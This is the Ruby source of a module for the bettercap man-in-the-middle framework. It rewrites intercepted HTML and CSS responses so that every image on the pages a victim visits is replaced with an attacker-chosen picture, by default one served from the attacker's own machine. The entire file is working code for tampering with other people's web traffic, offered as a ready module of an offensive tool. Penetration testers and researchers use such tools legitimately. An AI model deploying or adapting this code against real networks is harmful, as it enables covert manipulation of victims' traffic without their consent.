=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli, Nicholas Starke
Email  : evilsocket@gmail.com, nick@alephvoid.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# This module requires either the --httpd argument being passed
# to bettercap and the --httpd-path pointing to a folder
# which contains a "hack.png" image or the --image-url argument
# must be set.

class ReplaceImages < BetterCap::Proxy::Module
  @@image_url = nil

  def self.on_options(opts)
    opts.separator ""
    opts.separator "Replace Images Module"
    opts.separator ""

    opts.on('--image-url STRING', 'Image url to replace all images with') do |v|
      @@image_url = v.strip
    end
  end

  def initialize
    # make sure the server is running
    raise BetterCap::Error, "The ReplaceImages proxy module needs the HTTPD ( --httpd argument ) running." unless BetterCap::Context.get.options.httpd if @@image_url.nil?
    raise BetterCap::Error, "Argument Image Url must start with protocol" unless @@image_url.nil? unless @@image_url.start_with?('http://', 'https://')

    # make sure the file we need actually exists
    raise BetterCap::Error, "No hack.png file found in the HTTPD path ( --httpd-path argument ) '#{BetterCap::Context.get.options.httpd_path}'" \
      unless File.exist? "#{BetterCap::Context.get.options.httpd_path}/hack.png" if @@image_url.nil?

    @@image_url = "\"http://#{BetterCap::Context.get.ifconfig[:ip_saddr]}:#{BetterCap::Context.get.options.httpd_port}/hack.png\"" if @@image_url.nil?
  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.info "Replacing IMG tag images for http://#{request.host}#{request.url}."

      response.body.gsub! %r/["'][https:\/\/]*[^\s]+\.(png|jpg|jpeg|bmp|gif)["']/i, @@image_url
    elsif response.content_type =~ /^text\/css.*/
      BetterCap::Logger.info "Replaceing CSS images for http://#{request.host}#{request.url}."

      response.body.gsub!(/url\(.*\.(gif|jpg|jpeg|png|bmp).*\)/, "url('#{@@image_url}')")
    end
  end
end
